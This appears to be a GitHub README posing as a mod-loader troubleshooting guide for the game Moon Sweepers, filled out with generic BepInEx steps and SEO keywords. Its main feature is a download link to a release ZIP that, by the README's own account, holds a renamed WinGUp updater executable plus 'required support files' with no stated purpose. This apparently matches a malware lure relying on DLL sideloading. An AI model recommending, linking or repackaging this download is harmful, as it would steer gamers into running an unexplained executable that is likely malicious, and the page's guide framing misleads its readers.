# Moon Sweepers — Mod Loader Compatibility Guide

<p align="center">
  <img src="https://i.postimg.cc/cHV3dDdJ/banner.png" alt="Moon Sweepers — Mod Loader Compatibility Guide Banner" width="100%">
</p>

> **Moon Sweepers mod loader compatibility guide for BepInEx 6, IL2CPP metadata, patchers, plugin paths and installation troubleshooting.**

![Windows](https://img.shields.io/badge/Platform-Windows-0078D7?style=flat-square)
![Game](https://img.shields.io/badge/Game-Moon%20Sweepers-294c72?style=flat-square)
![Guide](https://img.shields.io/badge/Guide-v1.8.5-29a18d?style=flat-square)

## 📥 DOWNLOAD

### ⬇️ **[DOWNLOAD ZIP ARCHIVE — moon-sweepers-mod-loader-compatibility.zip](../../releases/latest/download/moon-sweepers-mod-loader-compatibility.zip)**

**Latest release:** [Open GitHub Releases](../../releases/latest)

**Release contents:** The included executable is a renamed copy of WinGUp configured for Notepad++ updates, not a Moon Sweepers fix. Follow the troubleshooting steps in this README for the game-related guidance.

## 🎯 What This Does

Compare the two independent Moon Sweepers mod-loader routes and identify why a plugin is not loading. The guide points to the original mod authors and avoids mixing incompatible plugin systems.

### Current game patch: 1.0.4

Community modding currently uses a BepInEx 6 IL2CPP route with a Moon Sweepers metadata patcher, or a separate standalone loader. Different mods require different loader families. These are community tools rather than official game patches.

## ✨ Features

- BepInEx versus standalone loader compatibility matrix
- IL2CPP metadata/patcher explanation
- Plugin and patcher folder placement checklist
- Log file interpretation and install isolation steps
- Links to original community-mod information

## 🧩 Problems Covered

- A BepInEx plugin does not load after installing the game mod
- “Unsupported metadata version” appears in the mod loader log
- A mod designed for one loader is dropped into another loader’s directory
- A new game update stops an installed mod from working

## 🚀 Installation

1. Download **`moon-sweepers-mod-loader-compatibility.zip`** from the release link above.
2. Extract the archive.
3. Read the troubleshooting steps below and follow them in the game.
4. The release ZIP also contains an executable and its required support files; the executable is not the offline guide.

## 🛠️ Troubleshooting / Fix Workflow

1. Confirm which loader family your chosen mod requires in the original author’s Requirements section.
2. Before changing game files, back up your game directory configuration and world save data.
3. For BepInEx plugins, use the required IL2CPP Windows x64 build and the Moon Sweepers-compatible metadata patcher.
4. Check the BepInEx\plugins and BepInEx\patchers folder placement for the appropriate files.
5. Read BepInEx\LogOutput.log for chainloader status and version errors.
6. For standalone-loader mods, follow the separate author-provided installation path instead of copying to BepInEx\plugins.
7. After updates, temporarily disable third-party mods while isolating game launch problems.

## ❓ FAQ

**Do all Moon Sweepers mods work with BepInEx?**  
No. Some require a separate standalone loader.

**Can I upload the community mods inside this repository?**  
Third-party mod redistribution requires the author’s permission; this guide links to the original source.

**What does an unsupported metadata error mean?**  
The installed loader may not understand the Unity IL2CPP metadata; use the patcher required by the specific mod.

## 📚 Verified References

- [Community mod loader guide](https://moonsweepers.org/mods/)
- [BepInEx official documentation](https://docs.bepinex.dev/)

## 📄 License

MIT — original repository documentation only. The bundled executable and dependencies retain their own respective licenses.

---

## 🔑 SEO Keywords

`moon sweepers mod loader`, `moon sweepers bepinex setup`, `moon sweepers unsupported metadata version`, `moon sweepers il2cpp patcher`, `moon sweepers mods not loading`, `moon sweepers plugin compatibility`

### GitHub Topics

`moon-sweepers`, `windows`, `pc-gaming`, `game-guide`, `troubleshooting`, `game-support`, `steam-game`, `moon-base`, `2026`, `mods`, `mod-loader`, `bepinex`, `il2cpp`, `mod-compatibility`, `game-modding`, `plugin-loader`, `mod-installation`, `mod-troubleshooting`, `unity-il2cpp`, `mod-guide`
